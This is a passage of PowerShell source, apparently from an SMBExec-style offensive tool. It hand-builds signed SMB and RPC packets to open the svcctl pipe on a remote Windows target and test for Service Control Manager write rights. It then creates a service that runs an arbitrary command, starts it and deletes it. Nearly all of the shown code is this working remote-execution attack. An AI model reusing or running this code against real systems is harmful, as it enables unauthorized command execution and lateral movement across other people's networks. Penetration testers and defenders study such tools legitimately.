                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'CheckAccess'           
                    }

                    'ReadAndXRequest'
                    {
                        Start-Sleep -m $Sleep
                        $packet_SMB_header = New-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBReadAndXRequest $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = $stage_next
                    }

                    'RPCBind'
                    {
                        $SMB_FID = $client_receive[42,43]
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $named_pipe_UUID 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'OpenSCManagerW'
                    }
                
                    'StartServiceW'
                    {
                    
                        if([System.BitConverter]::ToString($client_receive[112..115]) -eq '00-00-00-00')
                        {
                            Write-Verbose "Service $SMB_service created on $Target"
                            $SMB_service_context_handle = $client_receive[92..111]
                            $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                                $SMB_signing_counter = $SMB_signing_counter + 2 
                                [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                                $packet_SMB_header["Signature"] = $SMB_signing_sequence
                            }

                            $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                            $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                             
                            $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                                $SMB_signature = $MD5.ComputeHash($SMB_sign)
                                $SMB_signature = $SMB_signature[0..7]
                                $packet_SMB_header["Signature"] = $SMB_signature
                                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            Write-Verbose "[*] Trying to execute command on $Target"
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            $stage = 'ReadAndXRequest'
                            $stage_next = 'DeleteServiceW'  
                        }
                        elseif([System.BitConverter]::ToString($client_receive[112..115]) -eq '31-04-00-00')
                        {
                            Write-Output "[-] Service $SMB_service creation failed on $Target"
                            $stage = 'Exit'
                        }
                        else
                        {
                            Write-Output "[-] Service creation fault context mismatch"
                            $stage = 'Exit'
                        }
    
                    }
                
                    'TreeConnectAndXRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeConnectAndXRequest $SMB_path_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'CreateAndXRequest'
                    }

                    'TreeDisconnect'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeDisconnectRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Logoff'
                    }

                }
            
            }

        }  
        else
        {
            
            $stage = 'TreeConnect'

            try
            {

                while ($stage -ne 'Exit')
                {

                    switch ($stage)
                    {
                
                        'CheckAccess'
                        {

                            if([System.BitConverter]::ToString($client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                            {

                                $SMB_service_manager_context_handle = $client_receive[108..127]
                                
                                if($SMB_execute -eq $true)
                                {
                                    Write-Verbose "$output_username has Service Control Manager write privilege on $Target"
                                    $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                                    $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                    if($SCM_data.Length -lt $SMB_split_index)
                                    {
                                        $stage = 'CreateServiceW'
                                    }
                                    else
                                    {
                                        $stage = 'CreateServiceW_First'
                                    }

                                }
                                else
                                {
                                    Write-Output "[+] $output_username has Service Control Manager write privilege on $Target"
                                    $SMB_close_service_handle_stage = 2
                                    $stage = 'CloseServiceHandle'
                                }

                            }
                            elseif([System.BitConverter]::ToString($client_receive[128..131]) -eq '05-00-00-00')
                            {
                                Write-Output "[-] $output_username does not have Service Control Manager write privilege on $Target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                Write-Output "[-] Something went wrong with $Target"
                                $stage = 'Exit'
                            }

                        }

                        'CloseRequest'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
        
                            $packet_SMB2_data = New-PacketSMB2CloseRequest $file_ID
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }

                        'CloseServiceHandle'
                        {

                            if($SMB_close_service_handle_stage -eq 1)
                            {
                                Write-Verbose "Service $SMB_service deleted on $Target"
                                $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                            }
                            else
                            {
                                $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                            }

                            $SMB_close_service_handle_stage++
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)     
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }
                    
                        'CreateRequest'
                        {
                            $stage_current = $stage
                            $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                            $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00  
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data  
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            try
                            {
                                $client_stream.Write($client_send,0,$client_send.Length) > $null
                                $client_stream.Flush()
                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                                if(Get-StatusPending $client_receive[12..15])
                                {
                                    $stage = 'StatusPending'
                                }
                                else
                                {
                                    $stage = 'StatusReceived'
                                }

                            }
                            catch
                            {
                                Write-Output "[-] Session connection is closed"
                                $stage = 'Exit'
                            }                    

                        }

                        'CreateServiceW'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }

                        'CreateServiceW_First'
                        {
                            $stage_current = $stage
                            $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                            $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                            $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                            $SMB_split_index_tracker = $SMB_split_index
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'CreateServiceW_Middle'
                        {
                            $stage_current = $stage
                            $SMB_split_stage++
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                            $SMB_split_index_tracker += $SMB_split_index
                            $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                            $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'CreateServiceW_Last'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                            $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'DeleteServiceW'
                        { 

                            if([System.BitConverter]::ToString($client_receive[108..111]) -eq '1d-04-00-00')
                            {
                                Write-Output "[+] Command executed with service $SMB_service on $Target"
                            }
                            elseif([System.BitConverter]::ToString($client_receive[108..111]) -eq '02-00-00-00')
                            {
                                Write-Output "[-] Service $SMB_service failed to start on $Target"
                            }

                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                            }

                            $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }

                        'Logoff'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
            
                            $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }

                        'OpenSCManagerW'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $stage = 'SendReceive'
                        }

                        'ReadRequest'
                        {
                            Start-Sleep -m $Sleep
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2ReadRequest $file_ID
                            $packet_SMB2_data["Length"] = 0xff,0x00,0x00,0x00
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data 
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
